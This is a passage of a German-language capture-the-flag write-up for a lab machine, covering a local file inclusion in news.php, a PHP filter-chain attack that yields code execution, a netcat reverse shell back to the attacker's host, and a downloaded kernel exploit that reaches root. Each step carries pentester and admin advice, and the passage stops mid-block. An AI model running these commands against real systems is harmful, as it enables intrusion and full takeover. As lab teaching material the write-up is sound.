+<span class="command">email</span>                   [Status: 200, Size: 38124, Words: 6558, Lines: 400, Duration: 2ms]
+:: Progress: [1273833/1273833] :: Job [1/1] :: 4255 req/sec :: Duration: [0:05:15] :: Errors: 0 ::
+</pre> <!-- ffuf bestätigt ebenfalls 'email' als relevanten Parameter -->
+                  </div>
+            </div>
+
+            <hr>
+
+            <p class="analysis"><strong>Analyse:</strong> Es wird versucht, eine Local File Inclusion (LFI)-Schwachstelle im `year`-Parameter von `news.php` auszunutzen, um den Inhalt von `/etc/passwd` zu lesen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> **Erfolg!** Die URL `http://192.168.2.118/news.php?year=../../../../../../../etc/passwd` gibt den Inhalt der `/etc/passwd`-Datei zurück. Dies bestätigt eine kritische LFI-Schwachstelle im `year`-Parameter.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> LFI bestätigt! Dies ermöglicht das Lesen beliebiger Dateien, auf die der Webserver-Benutzer (`www-data`) Zugriff hat.
+                1.  Weitere sensible Dateien lesen (`/etc/shadow` - unwahrscheinlich lesbar, aber versuchen; `/etc/hosts`; `/etc/apache2/sites-available/000-default.conf`; `/var/www/html/news.php` Quellcode via `php://filter/convert.base64-encode/resource=news.php`).
+                2.  Prüfen, ob die LFI zu RCE eskaliert werden kann (z.B. via PHP-Wrapper `php://input`, `php://filter` mit speziellen Filtern, Log Poisoning, oder Einbinden von `/proc/self/environ`).<br>
+            <strong>Empfehlung (Admin):</strong> **LFI im `year`-Parameter sofort beheben!** Eingaben müssen strikt validiert werden (z.B. nur erlaubte Jahreszahlen zulassen). Path Traversal (`../`) muss verhindert werden. PHP-Konfiguration härten (`allow_url_fopen=Off`, `allow_url_include=Off`).</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <!-- Kein Prompt, da dies eine URL + Ausgabe ist -->
+                    <pre>
+<span class="command">http://192.168.2.118/news.php?year=../../../../../../../etc/passwd</span>
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
+systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
+messagebus:x:100:107::/nonexistent:/usr/sbin/nologin
+avahi-autoipd:x:101:109:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
+sshd:x:102:65534::/run/sshd:/usr/sbin/nologin
+<span class="command">sml:x:1000:1000:,,,:/home/sml:/bin/bash</span>
+</pre>
+                  </div>
+            </div>
+
+            <hr>
+
+            <p class="analysis"><strong>Analyse:</strong> Ein Tool namens `php_filter_chain_generator.py` (von GitHub) wird verwendet, um eine komplexe Filterkette für den `php://filter` Wrapper zu generieren. Das Ziel ist es, den PHP-Code `<?=`$GET[cmd]`?>` (Kurzform für `php echo \`$GET[cmd]\`; ?>`, führt einen Shell-Befehl aus dem `cmd`-Parameter aus) so zu kodieren, dass er trotz möglicher Filter ausgeführt wird.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Das Tool generiert eine sehr lange Kette von `convert.iconv.*` und `convert.base64-*` Filtern. Diese Technik wird verwendet, um bestimmte Zeichen oder Zeichenketten zu umgehen, die von Web Application Firewalls (WAFs) oder internen Filtern blockiert werden könnten, und ermöglicht dennoch die Ausführung des ursprünglichen Payloads über die LFI-Schwachstelle. Der generierte Payload wird im `year`-Parameter von `news.php` verwendet.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die generierte Filterkette verwenden, um RCE zu erlangen. Die URL wird mit der Filterkette im `year`-Parameter und einem zusätzlichen `&cmd=id`-Parameter aufgerufen.<br><strong>Empfehlung (Admin):</strong> LFI beheben ist die primäre Maßnahme. Zusätzlich können Techniken wie Filter-Chain-Angriffe durch eine gut konfigurierte WAF erkannt und blockiert werden. PHP härten (`allow_url_include=Off`).</p>
+             <div class="code-block">
+                <div class="terminal">
+                     <!-- Kein Prompt -->
+                    <pre>
+https://github.com/synacktiv/php_filter_chain_generator
+</pre>
+                 </div>
+            </div>
+             <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~/Hackingtools/php_filter_chain_generator]<br>└─# <span class="command">python3 php_filter_chain_generator.py --chain '$GET[cmd]'</span></div>
+                     <pre>
+[+] The following gadget chain will generate the following code : ?=`$GET[cmd]`? (base64 value: PD89YCRfR0VUW2NtZF1gPz4)
+<span class="command">php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP866.CSUNICODE|convert.iconv.CS....UTF7|convert.base64-decode/resource=php://temp</span>
+</pre>
+                  </div>
+            </div>
+        </section>
+
+        <section id="initial-access">
+             <h2>Initial Access (RCE via PHP Filter Chain)</h2>
+
+             <p class="analysis"><strong>Analyse:</strong> Die zuvor generierte PHP-Filterkette wird in der URL im `year`-Parameter verwendet. Zusätzlich wird der Parameter `&cmd=id` angehängt, um den `id`-Befehl auszuführen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> **Erfolg!** Die Ausgabe `<span class="password">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span>` erscheint im Response Body, gefolgt von Steuerzeichen und HTML-Code. Dies bestätigt, dass die Filterkette funktioniert hat und RCE als `www-data`-Benutzer über den `cmd`-Parameter möglich ist.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> RCE als `www-data` bestätigt. Nun einen Payload für eine Reverse Shell im `cmd`-Parameter übergeben, um eine interaktive Shell zu erhalten.<br><strong>Empfehlung (Admin):</strong> LFI beheben! PHP härten.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <!-- Kein Prompt, da dies eine URL + Ausgabe ist -->
+                    <pre>
+<span class="command">http://192.168.2.118/news.php?year=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|...[FILTER CHAIN GEKÜRZT]...|convert.base64-decode/resource=php://temp&cmd=id</span>
+
+<span class="password">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span>
+ �
+P�� � ������>�=�= � @ C� � ������>�=�= � @ C� � ������>�=�= � @ C� � ������>�=�= � @ C� � ������>�=�= � @ C� � ������>�=�= � @ 
+</pre> <!-- Filter Chain im Link gekürzt -->
+                  </div>
+            </div>
+
+             <hr>
+
+            <p class="analysis"><strong>Analyse:</strong> Die Filterkette wird erneut verwendet, diesmal mit dem Befehl `cmd=nc%20-e%20/bin/bash%20192.168.2.199%209001`, um eine Reverse Shell zum Angreifer-System (`192.168.2.199`) auf Port 9001 zu starten. Ein Netcat-Listener wird auf dem Angreifer-System gestartet.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> **Erfolg!** Der Netcat-Listener meldet eine eingehende Verbindung vom Zielsystem (`192.168.2.118`). Der Pentester hat nun eine Shell als Benutzer `www-data`.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Initial Access erfolgreich! Shell stabilisieren und mit der Enumeration für die Privilegieneskalation beginnen.<br><strong>Empfehlung (Admin):</strong> LFI/RCE beheben. Egress Filtering.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <!-- Kein Prompt, da dies die RCE URL ist -->
+                    <pre>
+<span class="command">http://192.168.2.118/news.php?year=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|...[FILTER CHAIN GEKÜRZT]...|convert.base64-decode/resource=php://temp&cmd=nc%20-e%20/bin/bash%20192.168.2.199%209001</span>
+</pre> <!-- Filter Chain im Link gekürzt -->
+                  </div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~/Hackingtools/php_filter_chain_generator]<br>└─# <span class="command">nc -lvnp 9001</span></div>
+                     <pre>
+listening on [any] 9001 ...
+<span class="password">connect to [192.168.2.199] from (UNKNOWN) [192.168.2.118] 43382</span>
+</pre> <!-- Shell prompt fehlt hier, aber Verbindung ist da -->
+                  </div>
+            </div>
+        </section>
+
+        <section id="privilege-escalation">
+            <h2>Privilege Escalation (Kernel Exploit - DirtyCred)</h2>
+
+             <p class="analysis"><strong>Analyse:</strong> In der erhaltenen Shell als `www-data` wird der Inhalt von `/var/www/html` aufgelistet.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Auflistung zeigt die Web-Dateien, darunter `news.php` und eine interessante XML-Datei `full-stack-apache-setup.xml` sowie Bilddateien.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die XML-Datei untersuchen. Mit der systematischen Enumeration beginnen (`uname -a`, `sudo -l`, SUID-Dateien, Cronjobs etc.).<br><strong>Empfehlung (Admin):</strong> Web-Root-Berechtigungen prüfen.</p>
+            <div class="code-block">
+                <div class="terminal">
+                     <!-- Prompt als www-data -->
+                    <div class="prompt" style="color: yellow;">www-data@blackhat2:/var/www/html$ <span class="command">ls -la</span></div>
+                     <pre>
+total 852
+drwxr-xr-x 2 root root   4096 Feb 26 10:19 .
+drwxr-xr-x 4 root root   4096 Feb 26 10:19 ..
+-rw-r--r-- 1 root root  31875 Feb 26 10:19 <span class="command">2021</span>
+-rw-r--r-- 1 root root  34213 Feb 26 10:19 <span class="command">2022</span>
+-rw-r--r-- 1 root root  36067 Feb 26 10:19 <span class="command">2023</span>
+-rw-r--r-- 1 root root 238753 Feb 26 10:19 <span class="command">dp.jpg</span>
+-rw-r--r-- 1 root root   4658 Feb 26 10:19 <span class="command">full-stack-apache-setup.xml</span>
+-rw-r--r-- 1 root root 485364 Feb 26 10:19 <span class="command">hacker.webp</span>
+-rw-r--r-- 1 root root    996 Feb 26 10:19 <span class="command">index.html</span>
+-rw-r--r-- 1 root root    996 Feb 26 10:19 <span class="command">index.php</span>
+-rw-r--r-- 1 root root   4560 Feb 26 10:19 <span class="command">news.php</span>
+-rw-r--r-- 1 root root   2332 Feb 26 10:19 <span class="command">style.css</span>
+</pre>
+                  </div>
+            </div>
+
+            <hr>
+
+            <p class="analysis"><strong>Analyse:</strong> Ein GitHub-Repository für `ExploitGSM` wird erwähnt. Dies deutet auf die Recherche nach einem spezifischen Exploit hin.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> `ExploitGSM` ist bekannt dafür, Schwachstellen im Linux-Kernel auszunutzen, die oft mit GSM-Subsystemen zusammenhängen, oder allgemeiner Kernel-Memory-Corruption-Fehler wie DirtyCred (CVE-2022-2588), welche auf bestimmten Kernel-Versionen (< 6.2) zur Privilegieneskalation führen können.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die Kernel-Version des Zielsystems (`uname -a`) prüfen und mit den Anforderungen des Exploits abgleichen. Wenn kompatibel, den Exploit herunterladen, kompilieren und ausführen.<br><strong>Empfehlung (Admin):</strong> Linux-Kernel **immer aktuell halten**, um bekannte Schwachstellen zu patchen. Kernel-Exploits sind eine häufige Methode zur Privilegieneskalation.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <!-- Kein Prompt -->
+                     <pre>
+https://github.com/YuriiCrimson/ExploitGSM
+</pre>
+                  </div>
+            </div>
+
+             <hr>
+
+             <p class="analysis"><strong>Analyse:</strong> Der Exploit `ExploitGSM` wird vom GitHub-Repository auf das Angreifer-System geklont, kompiliert und für den Transfer zum Zielsystem vorbereitet.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Standardvorgehen zur Vorbereitung eines kompilierten Exploits. Der Exploit wird erfolgreich gebaut.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Den kompilierten Exploit auf das Zielsystem übertragen.<br><strong>Empfehlung (Admin):</strong> Ausführung von unbekannten Binärdateien überwachen/verhindern. Härtung des Systems.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]<br>└─# <span class="command">cd Hackingtools</span></div>
+                      <!-- Keine Ausgabe -->
+                  </div>
+            </div>
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~/Hackingtools]<br>└─# <span class="command">git clone https://github.com/YuriiCrimson/ExploitGSM.git</span></div>
+                     <pre>
+Klone nach 'ExploitGSM'...
+remote: Enumerating objects: 91, done.
+remote: Counting objects: 100% (91/91), done.
+remote: Compressing objects: 100% (79/79), done.
+remote: Total 91 (delta 35), reused 25 (delta 7), pack-reused 0
+Empfange Objekte: 100% (91/91), 1.68 MiB | 6.48 MiB/s, fertig.
+Löse Unterschiede auf: 100% (35/35), fertig.
+</pre>
+                  </div>
+            </div>
+             <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~/Hackingtools]<br>└─# <span class="command">cd ExploitGSM</span></div>
+                      <!-- Keine Ausgabe -->
+                  </div>
+            </div>
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~/Hackingtools/ExploitGSM]<br>└─# <span class="command">ll</span></div>
+                     <pre>
+insgesamt 20
+drwxr-xr-x 2 root root 4096  3. Mai 15:31 docs
+drwxr-xr-x 2 root root 4096  3. Mai 15:31 <span class="command">ExploitGSM_5_15_to_6_1</span>
+drwxr-xr-x 2 root root 4096  3. Mai 15:31 ExploitGSM_6_5
+-rw-r--r-- 1 root root 1069  3. Mai 15:31 LICENSE
+drwxr-xr-x 2 root root 4096  3. Mai 15:31 OffsetGenerator
+</pre>
+                  </div>
+            </div>
+             <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~/Hackingtools/ExploitGSM]<br>└─# <span class="command">mkdir build</span></div>
+                      <!-- Keine Ausgabe -->
+                  </div>
+            </div>
+             <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~/Hackingtools/ExploitGSM]<br>└─# <span class="command">cd build</span></div>
+                      <!-- Keine Ausgabe -->
+                  </div>
+            </div>
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~/Hackingtools/ExploitGSM/build]<br>└─# <span class="command">cmake ../ExploitGSM_5_15_to_6_1</span></div>
+                     <pre>
+-- Configuring done (0.0s)
+-- Generating done (0.0s)
+-- Build files have been written to: /root/Hackingtools/ExploitGSM/build
+</pre>
+                  </div>
+            </div>
+             <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~/Hackingtools/ExploitGSM/build]<br>└─# <span class="command">make</span></div>
+                     <pre>
+[ 33%] Building C object CMakeFiles/ExploitGSM.dir/main.c.o
+[ 66%] Building C object CMakeFiles/ExploitGSM.dir/decompressors.c.o
+[100%] Linking C executable ExploitGSM
+<span class="password">[100%] Built target ExploitGSM</span>
+</pre>
+                  </div>
+            </div>
+
+            <hr>
+
+             <p class="analysis"><strong>Analyse:</strong> Der kompilierte Exploit `ExploitGSM` wird vom Angreifer-System auf das Zielsystem in das `/tmp`-Verzeichnis übertragen. Dazu wird auf dem Angreifer-System ein temporärer Python-HTTP-Server gestartet und auf dem Zielsystem `wget` verwendet.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Transfer des Exploits ist erfolgreich.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Den Exploit auf dem Zielsystem ausführbar machen und ausführen.<br><strong>Empfehlung (Admin):</strong> Übertragung und Ausführung von Dateien in `/tmp` überwachen und ggf. einschränken (z.B. `noexec`-Mount-Option für `/tmp`).</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <!-- Prompt Angreifer -->
+                    <div class="prompt">┌──(root㉿cyber)-[~/Hackingtools/ExploitGSM/build]<br>└─# <span class="command">python3 -m http.server 80</span></div>
+                     <pre>
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+</pre> <!-- Wartet auf Anfrage -->
+                  </div>
+            </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <!-- Prompt Zielsystem (www-data) -->
+                    <div class="prompt" style="color: yellow;">www-data@blackhat2:/var/www/html$ <span class="command">cd /tmp/</span></div>
+                      <!-- Keine Ausgabe -->
+                   <div class="prompt" style="color: yellow;">www-data@blackhat2:/tmp$ <span class="command">wget 192.168.2.199/ExploitGSM</span></div>
+                     <pre>
+--2024-05-03 15:39:26--  http://192.168.2.199/ExploitGSM
+Connecting to 192.168.2.199:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 1078824 (1.0M) [application/octet-stream]
+Saving to: ‘ExploitGSM’
+
+ExploitGSM              100%[=============================>]   1.03M  --.-KB/s    in 0.003s  
+
+<span class="password">2024-05-03 15:39:26 (365 MB/s) - ‘ExploitGSM’ saved [1078824/1078824]</span>
+</pre>
+                  </div>
+            </div>
+            <!-- Log des HTTP Servers -->
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~/Hackingtools/ExploitGSM/build]<br>└─# <span class="command">python3 -m http.server 80</span></div>
+                     <pre>
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+<span class="password">192.168.2.118 - - [03/May/2024 15:39:24] "GET /ExploitGSM HTTP/1.1" 200 -</span>
+</pre>
+                  </div>
+            </div>
+
+            <hr>
+
+             <p class="analysis"><strong>Analyse:</strong> Der Inhalt der Datei `full-stack-apache-setup.xml` aus dem Web-Root wird angezeigt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die XML-Datei enthält Apache/Nginx(?)-Konfigurationsdetails: Port 80, Hostname `www.blackhat2.com`, Aliase, geladene Module (u.a. `mod_security2`, `mod_evasive`), Rewrite-Regeln und eine interessante, aber auskommentierte `<serverName>`-Direktive: `<span class="command">newspapersbeta.blackhat2.hmv</span>`. ModSecurity und ModEvasive deuten auf vorhandene Sicherheitsmechanismen hin (WAF, Anti-DoS).</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die Information über ModSecurity/ModEvasive ist wichtig, falls Angriffe blockiert werden. Der Hostname `newspapersbeta.blackhat2.hmv` könnte auf eine weitere (interne?) Anwendung oder Subdomain hindeuten, die untersucht werden sollte (z.B. durch Hinzufügen zur `/etc/hosts`-Datei und Testen).<br><strong>Empfehlung (Admin):</strong> Konfigurationsdateien sollten nicht im Web-Root liegen. WAF (ModSecurity) und Anti-DoS (ModEvasive) sind gute Maßnahmen, müssen aber korrekt konfiguriert und gewartet werden.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt" style="color: yellow;">www-data@blackhat2:/var/www/html$ <span class="command">cat full-stack-apache-setup.xml</span></div>
+                    <pre>
+<apache>
+  <configuration>
+    <server>
+      <port>80</port>
+      <hostname>www.blackhat2.com</hostname>
+      <aliases>
+        <alias>www.blackhat2.net</alias>
+        <alias>api.blackhat2.com</alias>
+      </aliases>
+    </server>
+    <modules>
+      <module>mod_rewrite</module>
+      <module>mod_proxy</module>
+      <module>mod_ssl</module>
+      <module><span class="command">mod_security2</span></module>
+      <module><span class="command">mod_evasive</span></module>
+      <module>mod_headers</module>
+      <module>mod_deflate</module>
+      <module>mod_expires</module>
+      <module>mod_status</module>
+    </modules>
+    <rewrite>
+      <rule>
+        <match>^/(.*)$</match>
+        <rewrite>/index.php?q=$1</rewrite>
+      </rule>
+      <rule>
+        <match>^/api/(.*)$</match>
+        <rewrite>/api/index.php?q=$1</rewrite>
+        <condition type="host" pattern="api.blackhat2.com" />
+      </rule>
+    </rewrite>
+    <security>
+      <secRuleEngine>On</secRuleEngine>
+      <secRule>
+        <id>123456</id>
+        <rule>^(.*)$</rule>
+        <action>deny,status:403</action>
+      </secRule>
+      <secRule>
+        <id>234567</id>
+<!-- Auskommentierter oder unvollständiger Block -->
+<serverName><span class="command">newspapersbeta.blackhat2.hmv</span></serverName>
+
+</apache>
+</pre>
+                  </div>
+            </div>
+
+             <hr>
+
+            <p class="analysis"><strong>Analyse:</strong> Verschiedene Enumerationsbefehle werden als `www-data` ausgeführt, um Informationen über das System und potenzielle Schwachstellen für den Kernel-Exploit zu sammeln.</p>
+            <p class="evaluation"><strong>Bewertung:</strong>
+                *   Zugriff auf SSL-Zertifikat/Schlüssel wird versucht, scheitert aber (Datei nicht gefunden / Permission denied).
+                *   Debian Version 12 (`VERSION_ID="12"`) wird identifiziert.
+                *   Kernel-Konfigurationsoptionen (`CONFIG_SECURITY_SELINUX_DEVELOP=y`, `CONFIG_KEXEC=y`) werden gefunden. SELinux Develop-Mode könnte interessant sein, Kexec ist für Kernel-Exploits weniger relevant.
+                *   `dmesg` kann nicht gelesen werden (`Operation not permitted`).
+                *   Der Kernel-Symbol `selinux_state` wird gefunden.
+                *   Änderung von `kernel.kptr_restrict` scheitert (`permission denied`).</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die gesammelten Informationen (Debian 12, spezifische Kernel-Konfigs) bestätigen das Zielumfeld. Da `dmesg` und `sysctl`-Änderungen blockiert sind, ist die Informationsgewinnung leicht eingeschränkt. Der Fokus liegt nun auf der Ausführung des vorbereiteten Kernel-Exploits.<br><strong>Empfehlung (Admin):</strong> Zugriff auf `dmesg` für unprivilegierte Benutzer einschränken (`kernel.dmesg_restrict=1`). `kernel.kptr_restrict` auf `1` oder `2` setzen, um Kernel-Adress-Leaks zu erschweren. Unnötige Kernel-Module oder Debug-Optionen deaktivieren.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt" style="color: yellow;">www-data@blackhat2:/var/www/html$ <span class="command">cat /etc/ssl/certs/www_blackhat2_com.crt</span></div>
+                     <pre>
+cat: /etc/ssl/certs/www_blackhat2_com.crt: No such file or directory
+</pre>
+                    <div class="prompt" style="color: yellow;">www-data@blackhat2:/var/www/html$ <span class="command">cat /etc/ssl/private/www_blackhat2_com.key</span></div>
+                     <pre>
+cat: /etc/ssl/private/www_blackhat2_com.key: Permission denied
+</pre>
+                    <div class="prompt" style="color: yellow;">www-data@blackhat2:/var/www/html$ <span class="command">grep -R VERSION_ID /etc/os-release</span></div>
+                     <pre>
+<span class="command">VERSION_ID="12"</span>
+</pre>
+                     <div class="prompt" style="color: yellow;">www-data@blackhat2:/var/www/html$ <span class="command">grep CONFIG_SECURITY_SELINUX_DEVELOP /boot/config-`uname -r`</span></div>
+                     <pre>
+<span class="command">CONFIG_SECURITY_SELINUX_DEVELOP=y</span>
+</pre>
+                     <div class="prompt" style="color: yellow;">www-data@blackhat2:/var/www/html$ <span class="command">dmesg | tail -n 1</span></div>
+                     <pre>
+<span class="password">dmesg: read kernel buffer failed: Operation not permitted</span>
+</pre>
+                     <div class="prompt" style="color: yellow;">www-data@blackhat2:/var/www/html$ <span class="command">grep KEXEC /boot/config-`uname -r`</span></div>
+                     <pre>
+CONFIG_KEXEC=y
+CONFIG_KEXEC_FILE=y
+CONFIG_ARCH_HAS_KEXEC_PURGATORY=y
+CONFIG_KEXEC_SIG=y
+# CONFIG_KEXEC_SIG_FORCE is not set
+CONFIG_KEXEC_BZIMAGE_VERIFY_SIG=y
+# CONFIG_KEXEC_JUMP is not set
+CONFIG_KEXEC_CORE=y
+CONFIG_HAVE_IMA_KEXEC=y
+# CONFIG_IMA_KEXEC is not set
+</pre>
+                     <div class="prompt" style="color: yellow;">www-data@blackhat2:/var/www/html$ <span class="command">grep selinux_state /proc/kallsyms</span></div>
+                     <pre>
+0000000000000000 B selinux_state
+</pre>
+                     <div class="prompt" style="color: yellow;">www-data@blackhat2:/var/www/html$ <span class="command">sysctl -w kernel.kptr_restrict=1</span></div>
+                     <pre>
+<span class="password">sysctl: permission denied on key "kernel.kptr_restrict"</span>
+</pre>
+                  </div>
+            </div>
+
+             <hr>
+
+             <p class="analysis"><strong>Analyse:</strong> Im `/tmp`-Verzeichnis werden die heruntergeladenen Tools (`ExploitGSM`, `linpeas.sh`, `pspy64`) mit `chmod +x *` ausführbar gemacht. `linpeas.sh` und `pspy64` werden gestartet (die Ausgaben sind gemischt und teilweise von fehlgeschlagenen Kopier-/Ausführungsversuchen unterbrochen).</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Ausführung von LinPEAS und pspy liefert normalerweise viele Informationen zur weiteren Enumeration. Die Ausgabe ist hier jedoch unvollständig und von anderen Befehlen überlagert. Der entscheidende nächste Schritt ist die Ausführung des Kernel-Exploits.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Nach dem Transfer des Exploits diesen ausführen.<br><strong>Empfehlung (Admin):</strong> Siehe vorherige Empfehlungen zu `/tmp` und Monitoring.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt" style="color: yellow;">www-data@blackhat2:/tmp$ <span class="command">chmod +x *</span></div>
+                      <!-- Keine Ausgabe -->
+                   <div class="prompt" style="color: yellow;">www-data@blackhat2:/tmp$ <span class="command">ls -la</span></div>
+                     <pre>
+total 4884
+drwxrwxrwt  2 root     root        4096 May  4 23:18 .
+drwxr-xr-x 18 root     root        4096 Feb 26 09:58 ..
+-rwxr-xr-x  1 www-data www-data 1078824 May  4 00:57 <span class="command">ExploitGSM</span>
+-rwxr-xr-x  1 www-data www-data  827827 Nov 18 01:39 <span class="command">linpeas.sh</span>
+-rwxr-xr-x  1 www-data www-data 3078592 Nov 18 01:39 <span class="command">pspy64</span>
+</pre>
+                   <div class="prompt" style="color: yellow;">www-data@blackhat2:/tmp$ <span class="command">./linpeas.sh ./linpeas.sh && ./pspy64 fg</span></div>
+                    <!-- Linpeas/pspy Ausgabe und weitere Befehle vermischt/unvollständig -->
+                     <pre>
+[... Linpeas Banner ...]
+pspy64                  100%[=============================>]   2.94M  --.-KB/s    in 0.02s   
+
+2024-05-04 23:18:23 (188 MB/s) - ‘pspy64’ saved [3078592/3078592]
+</pre>
+                    <div class="prompt" style="color: yellow;">www-data@blackhat2:/tmp$ <span class="command">wget 192.168.2.199/ExploitGSM</span></div>
+                    <pre>
+--2024-05-04 23:18:55--  http://192.168.2.199/ExploitGSM
+Connecting to 192.168.2.199:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 1078824 (1.0M) [application/octet-stream]
+Saving to: ‘ExploitGSM’
+
+ExploitGSM              100%[=============================>]   1.03M  --.-KB/s    in 0.003s  
+
+2024-05-04 23:18:55 (320 MB/s) - ‘ExploitGSM’ saved [1078824/1078824]
+</pre>
+                    <div class="prompt" style="color: yellow;">www-data@blackhat2:/tmp$ <span class="command">chmod +x *</span></div>
+                     <!-- Keine Ausgabe -->
+                    <div class="prompt" style="color: yellow;">www-data@blackhat2:/tmp$ <span class="command">ls -la</span></div>
+                     <pre>
+total 4884
+drwxrwxrwt  2 root     root        4096 May  4 23:18 .
+drwxr-xr-x 18 root     root        4096 Feb 26 09:58 ..
+-rwxr-xr-x  1 www-data www-data 1078824 May  4 00:57 ExploitGSM
+-rwxr-xr-x  1 www-data www-data  827827 Nov 18 01:39 linpeas.sh
+-rwxr-xr-x  1 www-data www-data 3078592 Nov 18 01:39 pspy64
+</pre>
+                   <div class="prompt" style="color: yellow;">www-data@blackhat2:/tmp$ <span class="command">./linpeas.sh</span></div>
+                     <pre>
+[... Linpeas Banner ...]
+[1]+  Done                    ./linpeas.sh  
+</pre>
+                   <div class="prompt" style="color: yellow;">www-data@blackhat2:/tmp$ <span class="command">./linpeas.sh ./linpeas.sh & bg^C</span></div>
+                    <!-- Vermutlich fehlerhafte Eingabe -->
+                    <pre></pre>
+                   <div class="prompt" style="color: yellow;">www-data@blackhat2:/tmp$ <span class="command">./pspy64</span></div>
+                     <pre>
+pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855
+[... pspy Ausgabe ...]
+</pre>
+                  </div>
+            </div>
+
+             <hr>
+
+             <p class="analysis"><strong>Analyse:</strong> Der kompilierte Kernel-Exploit `ExploitGSM` wird im `/tmp`-Verzeichnis ausgeführt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> **Erfolg!** Der Exploit meldet:
+                *   Erkennung des Kernel-Pfads (`/boot/vmlinuz-6.1.0-18-amd64`).
+                *   Erkennung des Kompressionsformats (`xz`).
+                *   Erfolgreiches Extrahieren/Analysieren des Kernels.
+                *   Leak von Kernel-Adressen (`startup_xen`, `text`).
+                *   `<span class="password">We get root, spawn shell</span>`.
+            Der Prompt wechselt zu `root@blackhat2:/root#`, was die erfolgreiche Privilegieneskalation zu `root` bestätigt.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Root-Zugriff erlangt! Die User- und Root-Flags suchen und auslesen.<br><strong>Empfehlung (Admin):</strong> **Kernel dringend patchen!** Die verwendete Kernel-Version (`6.1.0-18`) ist anfällig für DirtyCred (CVE-2022-2588) oder ähnliche Exploits, die `ExploitGSM` implementiert. System-Monitoring zur Erkennung von Exploit-Ausführungen implementieren.</p>
+            <div class="code-block">
+                 <div class="terminal">
